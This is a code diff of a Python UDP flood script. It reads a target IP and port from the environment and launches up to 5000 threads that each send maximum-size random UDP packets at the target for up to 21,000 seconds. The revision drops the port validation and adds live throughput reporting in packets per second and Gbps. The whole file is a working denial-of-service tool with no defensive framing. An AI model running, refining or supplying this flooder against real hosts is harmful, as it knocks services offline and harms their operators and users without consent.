@@ -5,88 +5,88 @@ import threading
 import time
 import sys
 
-TARGET_IP = os.getenv("TARGET_IP", "").strip()
-TARGET_PORT_STR = os.getenv("TARGET_PORT", "80").strip()
-THREADS_STR = os.getenv("THREADS", "1000").strip()
-DURATION_STR = os.getenv("DURATION", "21000").strip()
+TARGET_IP    = os.getenv("TARGET_IP", "").strip()
+TARGET_PORT  = int(os.getenv("TARGET_PORT", "80").strip())
+THREADS      = min(int(os.getenv("THREADS", "1000").strip()), 5000)
+DURATION     = min(int(os.getenv("DURATION", "300").strip()), 21000)
 
-# Validation
 if not TARGET_IP:
     print("❌ ERROR: TARGET_IP not set", file=sys.stderr)
     sys.exit(1)
 
-try:
-    TARGET_PORT = int(TARGET_PORT_STR)
-    if not (1 <= TARGET_PORT <= 65535):
-        raise ValueError("Port out of range")
-except ValueError as e:
-    print(f"❌ ERROR: Invalid TARGET_PORT: {e}", file=sys.stderr)
-    sys.exit(1)
+print(f"🚀 UDP Flood starting")
+print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
+print(f"🧵 Threads: {THREADS}")
+print(f"⏰ Duration: {DURATION}s")
+print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
-try:
-    THREADS = min(int(THREADS_STR), 5000)  # max 5000 threads
-except ValueError:
-    THREADS = 1000
+running     = True
+sent_count  = 0
+bytes_sent  = 0
+lock        = threading.Lock()
 
-try:
-    DURATION = min(int(DURATION_STR), 21000)  # max 21000 seconds
-except ValueError:
-    DURATION = 300
-
-running = True
-sent_count = 0
-sent_lock = threading.Lock()
-
-def flood(ip, port):
-    global sent_count
-    sock = None
+def flood():
+    global sent_count, bytes_sent
     while running:
         try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(1)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             payload = os.urandom(65507)
-            sock.sendto(payload, (ip, port))
-            with sent_lock:
+            s.sendto(payload, (TARGET_IP, TARGET_PORT))
+            s.close()
+            with lock:
                 sent_count += 1
-        except OSError:
+                bytes_sent += len(payload)
+        except Exception:
             pass
-        finally:
-            if sock:
-                try:
-                    sock.close()
-                except Exception:
-                    pass
 
-def main():
-    global running
+# Start threads
+threads = []
+for i in range(THREADS):
+    t = threading.Thread(target=flood, daemon=True)
+    t.start()
+    threads.append(t)
 
-    print(f"🚀 UDP Flood starting")
-    print(f"🎯 Target: {TARGET_IP}:{TARGET_PORT}")
-    print(f"🧵 Threads: {THREADS}")
-    print(f"⏰ Duration: {DURATION}s")
+print(f"✅ {THREADS} threads launched!")
+print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
 
-    threads = []
-    for i in range(THREADS):
-        t = threading.Thread(target=flood, args=(TARGET_IP, TARGET_PORT), daemon=True)
-        t.start()
-        threads.append(t)
+start = time.time()
+last_count = 0
 
-    print(f"✅ {THREADS} threads started")
+try:
+    while time.time() - start < DURATION:
+        time.sleep(5)
+        elapsed  = int(time.time() - start)
+        remaining = DURATION - elapsed
 
-    start = time.time()
-    try:
-        while time.time() - start < DURATION:
-            elapsed = int(time.time() - start)
-            with sent_lock:
-                pkts = sent_count
-            print(f"📊 [{elapsed}s/{DURATION}s] Sent: {pkts} packets", flush=True)
-            time.sleep(10)
-    except KeyboardInterrupt:
-        print("⏹️ Interrupted")
-    finally:
-        running = False
+        with lock:
+            pkts  = sent_count
+            mbsent = bytes_sent / (1024 * 1024)
+            speed = (pkts - last_count) / 5  # packets per second
+            last_count = pkts
 
-    print(f"✅ Done. Total packets sent: {sent_count}")
+        gbps = (speed * 65507 * 8) / 1_000_000_000
 
-if __name__ == "__main__":
-    main()
+        print(
+            f"[{elapsed:5}s/{DURATION}s] "
+            f"Packets: {pkts:,} | "
+            f"Speed: {speed:.0f} pkt/s | "
+            f"Data: {mbsent:.1f} MB | "
+            f"~{gbps:.3f} Gbps | "
+            f"Remaining: {remaining}s",
+            flush=True
+        )
+except KeyboardInterrupt:
+    print("⏹️ Interrupted")
+finally:
+    running = False
+
+time.sleep(1)
+with lock:
+    final_mb = bytes_sent / (1024 * 1024)
+    final_gb = bytes_sent / (1024 * 1024 * 1024)
+
+print(f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+print(f"✅ DONE!")
+print(f"📊 Total Packets : {sent_count:,}")
+print(f"📦 Total Data    : {final_mb:.2f} MB ({final_gb:.3f} GB)")
+print(f"⏰ Duration      : {int(time.time()-start)}s")
